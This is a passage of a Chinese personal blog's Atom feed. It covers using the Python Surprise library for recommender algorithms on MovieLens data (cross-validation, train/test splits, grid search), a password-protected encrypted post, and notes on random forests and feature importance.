Fold 5  Mean    Std     </span><br><span class="line">RMSE (testset)    0.9398  0.9321  0.9413  0.9349  0.9329  0.9362  0.0037  </span><br><span class="line">MAE (testset)     0.7400  0.7351  0.7400  0.7364  0.7370  0.7377  0.0020  </span><br><span class="line">Fit time          5.66    5.47    5.46    5.60    5.77    5.59    0.12    </span><br><span class="line">Test time         0.24    0.14    0.18    0.15    0.15    0.17    0.04</span><br></pre>      </td>    </tr>  </table></figure><p>  该load_builtin()方法将提供下载movielens-100k数据集（如果尚未下载），并将其保存.surprise_data在主目录的文件夹中（您也可以选择将其保存在其他位置）。</p><p>我们在这里使用众所周知的 SVD 算法，但是有许多其他算法可用。</p><p>该cross_validate()  函数根据cv参数运行交叉验证过程，并计算一些accuracy度量。我们在这里使用经典的5倍交叉验证，但可以使用更高级的迭代器</p><p>（2）、测试集分解和fit()方法</p><p>如果您不想运行完整的交叉验证程序，可以使用对 train_test_split()  给定大小的训练集和测试集进行采样，并使用您的选择。您将需要使用将在列车集上训练算法的方法，以及将返回从testset进行的预测的方法：accuracy  metricfit()test()</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line">from surprise import SVD</span><br><span class="line">from surprise import Dataset</span><br><span class="line">from surprise import accuracy</span><br><span class="line">from surprise.model_selection import train_test_split</span><br><span class="line"></span><br><span class="line"># Load the movielens-100k dataset (download it if needed),</span><br><span class="line">data = Dataset.load_builtin(&apos;ml-100k&apos;)</span><br><span class="line"></span><br><span class="line"># sample random trainset and testset #  随机测试集和训练集</span><br><span class="line"># test set is made of 25% of the ratings. # 将25%的数据设置成测试集</span><br><span class="line">trainset, testset = train_test_split(data, test_size=.25)</span><br><span class="line"></span><br><span class="line"># We&apos;ll use the famous SVD algorithm.</span><br><span class="line">algo = SVD()</span><br><span class="line"></span><br><span class="line"># Train the algorithm on the trainset, and predict ratings for the testset # 在训练集中训练算法，并预测数据</span><br><span class="line">algo.fit(trainset)</span><br><span class="line">predictions = algo.test(testset)</span><br><span class="line"></span><br><span class="line"># Then compute RMSE</span><br><span class="line">accuracy.rmse(predictions)</span><br></pre>      </td>    </tr>  </table></figure><p>执行结果：</p><p>RMSE: 0.9461</p><p>（3）、训练整个训练集和predict()方法</p><p>  显然，我们也可以简单地将算法拟合到整个数据集，而不是运行交叉验证。这可以通过使用build_full_trainset()将构建trainset对象的方法来完成  ：<br>复制代码</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre>      </td>      <td class="code">        <pre><span class="line">from surprise import KNNBasic</span><br><span class="line">from surprise import Dataset</span><br><span class="line"></span><br><span class="line"># Load the movielens-100k dataset</span><br><span class="line">data = Dataset.load_builtin(&apos;ml-100k&apos;)</span><br><span class="line"></span><br><span class="line"># Retrieve the trainset.</span><br><span class="line"># 检索训练集</span><br><span class="line">trainset = data.build_full_trainset()</span><br><span class="line"></span><br><span class="line"># Build an algorithm, and train it.</span><br><span class="line"># 构建算法并训练</span><br><span class="line">algo = KNNBasic()</span><br><span class="line">algo.fit(trainset)</span><br><span class="line"></span><br><span class="line">uid = str(196)  # raw user id (as in the ratings file). They are **strings**!</span><br><span class="line">iid = str(302)  # raw item id (as in the ratings file). They are **strings**!</span><br><span class="line"></span><br><span class="line"># get a prediction for specific users and items.</span><br><span class="line"># ＃获取特定用户和项目的预测。</span><br><span class="line">pred = algo.predict(uid, iid, r_ui=4, verbose=True)</span><br></pre>      </td>    </tr>  </table></figure><p>预测结果：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">user: 196        item: 302        r_ui = 4.00   est = 4.06   &#123;&apos;actual_k&apos;: 40, &apos;was_impossible&apos;: False&#125;</span><br><span class="line"># est表示预测值</span><br></pre>      </td>    </tr>  </table></figure><p> 以上都是使用内置的数据集。</p><p>2、使用自定义数据集</p><p>Surprise有一组内置  数据集，但您当然可以使用自定义数据集。加载评级数据集可以从文件（例如csv文件）或从pandas数据帧完成。无论哪种方式，您都需要Reader为Surprise定义一个对象，以便能够解析文件或数据帧。<br>复制代码</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre>      </td>      <td class="code">        <pre><span class="line"># 要从文件（例如csv文件）加载数据集，您将需要以下 load_from_file()方法：</span><br><span class="line"></span><br><span class="line">from surprise import BaselineOnly</span><br><span class="line">from surprise import Dataset</span><br><span class="line">from surprise import Reader</span><br><span class="line">from surprise.model_selection import cross_validate</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># path to dataset file</span><br><span class="line"># 数据集路径</span><br><span class="line">file_path = os.path.expanduser(r&apos;C:/Users/FELIX/.surprise_data/ml-100k/ml-100k/u.data&apos;)</span><br><span class="line"></span><br><span class="line"># As we&apos;re loading a custom dataset, we need to define a reader. In the</span><br><span class="line"># movielens-100k dataset, each line has the following format:</span><br><span class="line"># &apos;user item rating timestamp&apos;, separated by &apos;\t&apos; characters.</span><br><span class="line"># ＃当我们加载自定义数据集时，我们需要定义一个reader。在</span><br><span class="line"># ＃movielens-100k数据集中，每一行都具有以下格式：</span><br><span class="line"># ＃&apos;user item rating timestamp&apos;，以&apos;\ t&apos;字符分隔。</span><br><span class="line">reader = Reader(line_format=&apos;user item rating timestamp&apos;, sep=&apos;\t&apos;)</span><br><span class="line"></span><br><span class="line">data = Dataset.load_from_file(file_path, reader=reader)</span><br><span class="line"></span><br><span class="line"># We can now use this dataset as we please, e.g. calling cross_validate</span><br><span class="line"># ＃我们现在可以随意使用这个数据集，例如调用cross_validate</span><br><span class="line">cross_validate(BaselineOnly(), data, verbose=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 要从pandas数据框加载数据集，您将需要该 load_from_df()方法。您还需要一个Reader对象，但只能rating_scale指定参数。数据框必须有三列，对应于用户（原始）ID，项目（原始）ID以及此顺序中的评级。因此，每行对应于给定的评级。这不是限制性的，因为您可以轻松地重新排序数据框的列</span><br><span class="line"></span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">from surprise import NormalPredictor</span><br><span class="line">from surprise import Dataset</span><br><span class="line">from surprise import Reader</span><br><span class="line">from surprise.model_selection import cross_validate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Creation of the dataframe. Column names are irrelevant.</span><br><span class="line"># ＃创建数据帧。列名无关紧要。</span><br><span class="line">ratings_dict = &#123;&apos;itemID&apos;: [1, 1, 1, 2, 2],</span><br><span class="line">                &apos;userID&apos;: [9, 32, 2, 45, &apos;user_foo&apos;],</span><br><span class="line">                &apos;rating&apos;: [3, 2, 4, 3, 1]&#125;</span><br><span class="line">df = pd.DataFrame(ratings_dict)</span><br><span class="line"></span><br><span class="line"># A reader is still needed but only the rating_scale param is requiered.</span><br><span class="line"># ＃仍然需要一个reader，但只需要rating_scale param。</span><br><span class="line">reader = Reader(rating_scale=(1, 5))</span><br><span class="line"></span><br><span class="line"># The columns must correspond to user id, item id and ratings (in that order).</span><br><span class="line"># ＃列必须对应于用户ID，项目ID和评级（按此顺序）。</span><br><span class="line">data = Dataset.load_from_df(df[[&apos;userID&apos;, &apos;itemID&apos;, &apos;rating&apos;]], reader)</span><br><span class="line"></span><br><span class="line"># We can now use this dataset as we please, e.g. calling cross_validate</span><br><span class="line"># ＃我们现在可以随意使用这个数据集，例如调用cross_validate </span><br><span class="line">cross_validate(NormalPredictor(), data, cv=2)</span><br></pre>      </td>    </tr>  </table></figure><p>3、使用交叉验证迭代器</p><p>  对于交叉验证，我们可以使用cross_validate()为我们完成所有艰苦工作的功能。但是为了更好地控制，我们还可以实现交叉验证迭代器，并使用split()迭代器的test()方法和算法的  方法对每个拆分进行预测 。这是一个例子，我们使用经典的K-fold交叉验证程序和3个拆分：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line">from surprise import SVD</span><br><span class="line">from surprise import Dataset</span><br><span class="line">from surprise import accuracy</span><br><span class="line">from surprise.model_selection import KFold</span><br><span class="line"></span><br><span class="line"># Load the movielens-100k dataset</span><br><span class="line">data = Dataset.load_builtin(&apos;ml-100k&apos;)</span><br><span class="line"></span><br><span class="line"># define a cross-validation iterator</span><br><span class="line"># define一个交叉验证迭代器</span><br><span class="line">kf = KFold(n_splits=3)</span><br><span class="line"></span><br><span class="line">algo = SVD()</span><br><span class="line"></span><br><span class="line">for trainset, testset in kf.split(data):</span><br><span class="line"></span><br><span class="line">    # train and test algorithm.</span><br><span class="line">    #训练和测试算法。</span><br><span class="line">    algo.fit(trainset)</span><br><span class="line">    predictions = algo.test(testset)</span><br><span class="line"></span><br><span class="line">    # Compute and print Root Mean Squared Error</span><br><span class="line">    # 计算并打印输出</span><br><span class="line">    accuracy.rmse(predictions, verbose=True)</span><br></pre>      </td>    </tr>  </table></figure><p>  可以使用其他交叉验证迭代器，如LeaveOneOut或ShuffleSplit。在这里查看所有可用的迭代器。Surprise的交叉验证工具的设计源于优秀的scikit-learn  API。</p><p>交叉验证的一个特例是当折叠已经被某些文件预定义时。例如，movielens-100K数据集已经提供了5个训练和测试文件（u1.base，u1.test …  u5.base，u5.test）。惊喜可以通过使用surprise.model_selection.split.PredefinedKFold  对象来处理这种情况：<br>复制代码</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre>      </td>      <td class="code">        <pre><span class="line">from surprise import SVD</span><br><span class="line">from surprise import Dataset</span><br><span class="line">from surprise import Reader</span><br><span class="line">from surprise import accuracy</span><br><span class="line">from surprise.model_selection import PredefinedKFold</span><br><span class="line"></span><br><span class="line"># path to dataset folder</span><br><span class="line">files_dir = os.path.expanduser(&apos;~/.surprise_data/ml-100k/ml-100k/&apos;)</span><br><span class="line"></span><br><span class="line"># This time, we&apos;ll use the built-in reader.</span><br><span class="line">reader = Reader(&apos;ml-100k&apos;)</span><br><span class="line"></span><br><span class="line"># folds_files is a list of tuples containing file paths:</span><br><span class="line"># [(u1.base, u1.test), (u2.base, u2.test), ... (u5.base, u5.test)]</span><br><span class="line">train_file = files_dir + &apos;u%d.base&apos;</span><br><span class="line">test_file = files_dir + &apos;u%d.test&apos;</span><br><span class="line">folds_files = [(train_file % i, test_file % i) for i in (1, 2, 3, 4, 5)]</span><br><span class="line"></span><br><span class="line">data = Dataset.load_from_folds(folds_files, reader=reader)</span><br><span class="line">pkf = PredefinedKFold()</span><br><span class="line"></span><br><span class="line">algo = SVD()</span><br><span class="line"></span><br><span class="line">for trainset, testset in pkf.split(data):</span><br><span class="line"></span><br><span class="line">    # train and test algorithm.</span><br><span class="line">    algo.fit(trainset)</span><br><span class="line">    predictions = algo.test(testset)</span><br><span class="line"></span><br><span class="line">    # Compute and print Root Mean Squared Error</span><br><span class="line">    accuracy.rmse(predictions, verbose=True)</span><br></pre>      </td>    </tr>  </table></figure><p>当然，也可以对单个文件进行训练和测试。但是folds_files参数仍然要列表的形式。</p><p>4、使用GridSearchCV调整算法参数</p><p>该cross_validate()函数报告针对给定参数集的交叉验证过程的准确度度量。如果你想知道哪个参数组合能产生最好的结果，那么这个  GridSearchCV类就可以解决了。给定一个dict参数，该类详尽地尝试所有参数组合并报告任何精度测量的最佳参数（在不同的分裂上取平均值）。它受到scikit-learn的GridSearchCV的启发。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line">from surprise import SVD</span><br><span class="line">from surprise import Dataset</span><br><span class="line">from surprise.model_selection import GridSearchCV</span><br><span class="line"></span><br><span class="line"># Use movielens-100K</span><br><span class="line">data = Dataset.load_builtin(&apos;ml-100k&apos;)</span><br><span class="line"></span><br><span class="line">param_grid = &#123;&apos;n_epochs&apos;: [5, 10], &apos;lr_all&apos;: [0.002, 0.005],</span><br><span class="line">              &apos;reg_all&apos;: [0.4, 0.6]&#125;</span><br><span class="line">gs = GridSearchCV(SVD, param_grid, measures=[&apos;rmse&apos;, &apos;mae&apos;], cv=3)</span><br><span class="line"></span><br><span class="line">gs.fit(data)</span><br><span class="line"></span><br><span class="line"># best RMSE score</span><br><span class="line">print(gs.best_score[&apos;rmse&apos;]) # 输出最高的准确率的值</span><br><span class="line"></span><br><span class="line"># combination of parameters that gave the best RMSE score</span><br><span class="line">print(gs.best_params[&apos;rmse&apos;]) # 输出最好的批次，学习率参数</span><br></pre>      </td>    </tr>  </table></figure><p>通过上面操作得到最佳参数后就可以使用该参数的算法：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"># We can now use the algorithm that yields the best rmse:</span><br><span class="line">algo = gs.best_estimator[&apos;rmse&apos;]</span><br><span class="line">algo.fit(data.build_full_trainset())</span><br></pre>      </td>    </tr>  </table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;sklearn/surprise&lt;br&gt;&lt;img src=&quot;https://github.com/starstarb/clouding/raw/master/head/f2deaa2d8bcb907b31c759089e262f09.jpg&quot; alt&gt;
&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://javastar.club/categories/python/"/>
    
    
      <category term="python" scheme="http://javastar.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python机器学习笔记1</title>
    <link href="http://javastar.club/archives/3012948c.html"/>
    <id>http://javastar.club/archives/3012948c.html</id>
    <published>2019-08-08T07:09:03.000Z</published>
    <updated>2019-08-23T03:20:50.885Z</updated>
    
    <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1+/zpGcTX9EOREZD7FqCwMsSBbNg+opHN5YUPAR3wZk8mgzX31MhcztyUccxop5MOkob6uL98wEzep4gGnNOYqPdSoZnU39D1eLuJoFxulkHQRnYH6bv+BuFBvPkjFBdgi0dZLWmHQY9b5Hi+yUNSjvWQ2BjYgpfXMHC1/my41WrjgIZ7eKCxbagGpxOShrS3wjSEDpNhd0SfwXqZCiWLN1nEaBkUosXf75Y57jsCi/TogTmiIAMT5DXHbKjcEoJNqZpIRolgbY9AJnSbDyM2pKhnC7ygRci5hWRMcT+KVzL4bPMwNoLAV5EA9OMcDemZJmnka+Q3Dd05HI+UrKiHWHoz3KSJ1Lc/duEAwnMY9amoh9VqO0BWa1ITrA8UWtD+cX44IXHvl3VsU/MNnoPzZk6f9qTtzmmWeDHm+er1FQX3yST4VkSz717xV++xgqQ9st+MEdd0IBcRm2mQThbF+QGGBuERmCzbChn8/xBciq+1Gi+sGEACKHhvnn6OWX6SrJkYbdochputgAmj/BR8S90XkmWVblII0dl5iUhInBlL3nVvUF8VYmMU8kQyzkMmRnFeWpxuUd6qh1VM4PR+yH0WwjU59XR2pP+pxj9e4wkcp+AgrfofdnM3erVSgjlzF6WZG6wSrsutPCOq6vqUpDPp756w6RCq/kYOIePuVt4eeRAyhxWpJOgQNjXPLfHVmrp1izx6EhzTbGORAV4l021keMyRRfwFEjDDdPKYalW3bhOCPOSGuSGccftxlne9wQ1wjFjD+tCT4p+W/+LoSCjOgoqNrgp0D/UU+lCAzkmUaWk+y/NPirGBztys7j9KPLb2pHgxeYXxXkYkTMvtxU+8QYhdedy51RrO5MXIPYzXMiqtW6M35s6aJIYmo5q7cyl9MdOqdtc3u2vus/kXzLGnaMwJTX59s1WcMjNAYCUT/9TXP6dAVvKZ4f4joqd1PvhPlGbpfp0w19qBJx6hUy4Zxa5N9mWyr6dU6nHfW3+WTFZQLTaykrHXmawwCsafw0Kybxe6ghB9tn1ZcH/FVC8e9Fdyh0LsBpjf5T8Q8ONR5shIm7u5ysE4OujwKBCg3sLGm2k8kJsfhv7m7noSLcVbpL2XVSM77q4l56+X2iazozijsRDGPza0xm1UG+VVK+7keXgrbHXhKLiNE+CECt9bgK9KI3FsAAUSk7JiIQxQbL6M0fGwyJBqxaUS0rhLt6r+iF7U0DkT1CbaGEDeBFBmlHuRzPQJDhGUSUpSVl4cPDNiKiBMmUZC7sjJyAkZHRZaRJR5AmXw4yRn26vNiObFsZBOBv4BqfTUWO25p3SngmjXdKG6twRvSE0Wwe3FUX/nCNRejyHps2lRQIaNhHGMRq3PWZl21R6qGIXxj92MPgiSUd1k6IVleSfzW6CHgIWkYaHXQ/9s/uPQmU9+sEeqfYOXfqcKhiv2sjMJbCrLBuxnlMIQuaYPS1lpN7VYrcxfljTEU1xm4M1WjqH2ha8Y/dsGrrsCWY/09eTLMVfLnbCcMOudUVUsj+0rdhtF61jJsWGhCrtA==</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="python" scheme="http://javastar.club/categories/python/"/>
    
    
      <category term="python" scheme="http://javastar.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python机器学习笔记</title>
    <link href="http://javastar.club/archives/a80115f8.html"/>
    <id>http://javastar.club/archives/a80115f8.html</id>
    <published>2019-08-08T07:08:46.000Z</published>
    <updated>2019-08-16T03:11:33.474Z</updated>
    
    <content type="html"><![CDATA[<p>随机森林算法，参考：<a href="https://www.cnblogs.com/wj-1314/p/9628303.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.cnblogs.com/wj-1314/p/9628303.html</a><br><img src="https://github.com/starstarb/clouding/raw/master/head/e7f428d6ca1cf376e564c5a45b13e431.jpg" alt></p><a id="more"></a><h3 id="随机森林算法的理论知识"><a href="#随机森林算法的理论知识" class="headerlink" title="随机森林算法的理论知识"></a>随机森林算法的理论知识</h3><p>  　　随机森林是一种有监督学习算法，是以决策树为基学习器的集成学习算法。随机森林非常简单，易于实现，计算开销也很小，但是它在分类和回归上表现出非常惊人的性能，因此，随机森林被誉为“代表集成学习技术水平的方法”。</p><h4 id="一，随机森林的随机性体现在哪几个方面？"><a href="#一，随机森林的随机性体现在哪几个方面？" class="headerlink" title="一，随机森林的随机性体现在哪几个方面？"></a>一，随机森林的随机性体现在哪几个方面？</h4><p><strong>1，数据集的随机选取</strong></p><p>  　　从原始的数据集中采取有放回的抽样（bagging），构造子数据集，子数据集的数据量是和原始数据集相同的。不同子数据集的元素可以重复，同一个子数据集中的元素也可以重复。</p><p><strong>2，待选特征的随机选取</strong></p><p>  　　与数据集的随机选取类似，随机森林中的子树的每一个分裂过程并未用到所有的待选特征，而是从所有的待选特征中随机选取一定的特征，之后再在随机选取的特征中选取最优的特征</p><h4 id="二，为什么使用随机森林？"><a href="#二，为什么使用随机森林？" class="headerlink" title="二，为什么使用随机森林？"></a>二，为什么使用随机森林？</h4><p>1，随机森林既可以用于分类问题，也可以用于回归问题</p><p>2，过拟合是个关键的问题，可能会让模型的结果变得糟糕，但是对于随机森林来说，如果随机森林的树足够多，那么分类器就不会过拟合模型</p><p>3，随机森林分类器可以处理缺失值</p><p>4，随机森林分类器可以用分类值建模</p><h4 id="三，随机森林的构建过程"><a href="#三，随机森林的构建过程" class="headerlink" title="三，随机森林的构建过程"></a>三，随机森林的构建过程</h4><p>1，从原始训练集中使用Bootstraping方法随机有放回采样取出m个样本，共进行n_tree次采样。生成n_tree个训练集</p><p>2，对n_tree个训练集，我们分别训练n_tree个决策树模型</p><p>3，对于单个决策树模型，假设训练样本特征的个数为n，那么每次分裂时根据信息增益/信息增益比/基尼指数 选择最好的特征进行分裂</p><p>4，每棵树都已知这样分裂下去，知道该节点的所有训练样例都属于同一类。在决策树的分裂过程中不需要剪枝</p><p>5，将生成的多颗决策树组成随机森林。对于分类问题，按照多棵树分类器投票决定最终分类结果；对于回归问题，由多颗树预测值的均值决定最终预测结果</p><p>注意：OOB（out-of-bag ）：每棵决策树的生成都需要自助采样，这时就有1/3的数据未被选中，这部分数据就称为袋外数据。<br><img src="https://github.com/starstarb/clouding/raw/master/python/%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97.png" alt></p><h4 id="四，随机森林优缺点总结"><a href="#四，随机森林优缺点总结" class="headerlink" title="四，随机森林优缺点总结"></a>四，随机森林优缺点总结</h4><p><strong>优点</strong></p><ul>  <li>由于采用了集成算法，本身精度比大多数单个算法要好，所以准确性高</li>  <li>在测试集上表现良好，由于两个随机性的引入，使得随机森林不容易陷入过拟合（样本随机，特征随机）</li>  <li>在工业上，由于两个随机性的引入，使得随机森林具有一定的抗噪声能力，对比其他算法具有一定优势</li>  <li>由于树的组合，使得随机森林可以处理非线性数据，本身属于非线性分类（拟合）模型</li>  <li>它能够处理很高维度（feature很多）的数据，并且不用做特征选择，对数据集的适应能力强：既能处理离散型数据，也能处理连续型数据，数据集无需规范化  </li>  <li>训练速度快，可以运用在大规模数据集上</li>  <li>可以处理缺省值（单独作为一类），不用额外处理</li>  <li>由于有袋外数据（OOB），可以在模型生成过程中取得真实误差的无偏估计，且不损失训练数据量</li>  <li>在训练过程中，能够检测到feature间的互相影响，且可以得出feature的重要性，具有一定参考意义</li>  <li>由于每棵树可以独立、同时生成，容易做成并行化方法</li>  <li>由于实现简单、精度高、抗过拟合能力强，当面对非线性数据时，适于作为基准模型</li></ul><p><strong>缺点</strong></p><p>  当随机森林中的决策树个数很多时，训练时需要的空间和时间会比较大<br>随机森林中还有许多不好解释的地方，有点算是黑盒模型<br>在某些噪音比较大的样本集上，RF的模型容易陷入过拟合</p><h4 id="五，特征重要性评估"><a href="#五，特征重要性评估" class="headerlink" title="五，特征重要性评估"></a>五，特征重要性评估</h4><p>  　　现实情况下，一个数据集中往往有成百上千个特征，如何在其中选择比结果影响最大的那几个特征，以此来缩减建立模型时特征数是我们比较关心的问题。这样的方法其实很多，比如主成分分析，lasso等等。不过这里我们学习的是用随机森林来进行特征筛选。</p><p>　　用随机森林进行特征重要性评估的思想就是看每个特征在随机森林中的每棵树上做了多大的贡献，然后取个平均值，最后比一比特征之间的贡献大小。</p><p>　　贡献大小通常使用基尼指数（Gini index）或者袋外数据（OOB）错误率作为评估指标来衡量。这里我们再学习一下基尼指数来评价的方法。</p><p>　　我们将变量重要性评分（variable importance  measures）用VIM来表示，将Gini指数用GI来表示，假设m个特征X1，X2，X3，……Xc，现在要计算出每个特征Xj的Gini指数评分VIMj（Gini）,亦即第j个特征在RF所有决策树中节点分裂不纯度的平均改变量。</p><p>　　Gini指数的计算公式为：<br><img src="https://github.com/starstarb/clouding/raw/master/python/Gini.png" alt><br>其中，K表示有K个类别。Pmk表示节点m中类列k所占的比例。</p><p>　　直观的说，就是随便从节点m中随机抽取两个样本，其类别标记不一致的概率。</p><p>　　特征Xj在节点m的重要性，即节点m分支前后的Gini指数变化量为：<br><img src="https://github.com/starstarb/clouding/raw/master/python/VIM.png" alt><br>其中，GIl和GIr分别表示分枝后两个新节点的Gini指数。</p><p>　　如果，特征Xj在决策树i中出现的节点在集合M中，那么Xj在第i颗树的重要性为：<br><img src="https://github.com/starstarb/clouding/raw/master/python/VIMIT.png" alt><br>假设RF中共有n颗树，那么<br><img src="https://github.com/starstarb/clouding/raw/master/python/VIMij.png" alt><br>　最后，把所有求得的重要性评分做一个归一化处理即可。<br><img src="https://github.com/starstarb/clouding/raw/master/python/VIMsum.png" alt></p><h5 id="5-1-特征选择"><a href="#5-1-特征选择" class="headerlink" title="5.1 特征选择"></a>5.1  特征选择</h5><p><strong>5.1.1 特征选择的步骤</strong></p><p>　　在特征重要性的基础上，特征选择的步骤如下：</p><ul>  <li>计算每个特征的重要性，并按降序排序</li>  <li>确定要剔除的比例，依据特征重要性剔除相应比例的特征，得到一个新的特征集</li>  <li>用新的特征集重复上述过程，直到剩下m个特征（m为提前设定的值）</li>  <li>根据上述代码中得到的各个特征集合特征集对应的袋外误差率，选择袋外误差率最低的特征集</li>  <li><em>5.1.2 特征重要性的估计方法*</em></li></ul><p>  　　特征重要性的估计通常有两种方法：一是使用uniform或者gaussian抽取随机值替换原特征；一是通过permutation的方式将原来的所有N个样本的第i个特征值重新打乱分布，第二种方法更加科学，保证了特征替代值与原特征的分布是近似的。这种方法叫做permutation  test ，即在计算第i个特征的重要性的时候，将N 个特征的第i个特征重新洗牌，然后比较D和表现的差异性，如果差异很大，则表明第i个特征是重要的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;随机森林算法，参考：&lt;a href=&quot;https://www.cnblogs.com/wj-1314/p/9628303.html&quot; rel=&quot;external nofollow noopener noreferrer&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/wj-1314/p/9628303.html&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;https://github.com/starstarb/clouding/raw/master/head/e7f428d6ca1cf376e564c5a45b13e431.jpg&quot; alt&gt;
&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://javastar.club/categories/python/"/>
    
    
      <category term="python" scheme="http://javastar.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>debug技巧总结</title>
    <link href="http://javastar.club/archives/fe81e267.html"/>
    <id>http://javastar.club/archives/fe81e267.html</id>
    <published>2019-08-08T03:41:29.000Z</published>
    <updated>2019-08-23T03:28:34.442Z</updated>
    
